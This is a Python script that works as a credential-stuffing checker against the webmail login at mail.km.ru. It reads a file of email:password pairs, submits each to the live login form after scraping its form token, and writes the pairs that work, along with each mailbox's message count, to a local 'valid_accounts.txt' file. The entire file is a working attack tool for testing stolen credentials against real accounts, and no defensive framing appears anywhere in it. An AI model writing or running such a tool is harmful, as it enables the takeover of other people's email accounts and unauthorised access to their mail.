import requests , colorama
from bs4 import BeautifulSoup
colorama.init()
filename = input("Enter file name: ")
with open(filename, 'r') as f:
    num_lines = sum(1 for line in f)
print(f"Processing {num_lines} ACCOUNT : ")
valid_counter = 0
invalid_counter = 0
with open(filename, 'r') as f:
    lines = f.readlines()
    num_lines = len(lines)
    for line in lines:
        line = line.strip()
        username, password = line.split(':')
        if '@km.ru' not in username:
            print('Not a km.ru account')
            continue
        username = username.split('@')[0]
        url = 'https://mail.km.ru/'
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        form_build_id = soup.find('input', {'name': 'form_build_id'})
        if form_build_id is not None:
            form_build_id = form_build_id['value']
            payload = {
                'user_login': username,
                'user_domain': '@km.ru',
                'user_password': password,
                'form_build_id': form_build_id,
                'form_id': '_imap_mail_login_form'
            }
            response = requests.post(url, data=payload)
        else:
            print('Form build ID not found.')
        if 'Ошибка' in response.content.decode('utf-8'):
            invalid_counter += 1
            print(colorama.Fore.RED + f"{username}:{password}" + colorama.Style.RESET_ALL)
        else:
            valid_counter += 1
            soup = BeautifulSoup(response.content, "html.parser")
            title = soup.title.text
            start = title.find("(")
            end = title.find(")")
            if start != -1 and end != -1:
                result = title[start:end + 1]
                text = result.replace("из", "From")
                print(colorama.Fore.GREEN + f"{username}:{password}" + colorama.Style.RESET_ALL)
                with open('D:/valid_accounts.txt', 'a') as outfile:
                    outfile.write(username + ':' + password + ' Number of Messages : ' + text + '\n')
print("Valid: " + str(valid_counter))
print("Invalid: " + str(invalid_counter))
input("Press Enter to exit...")
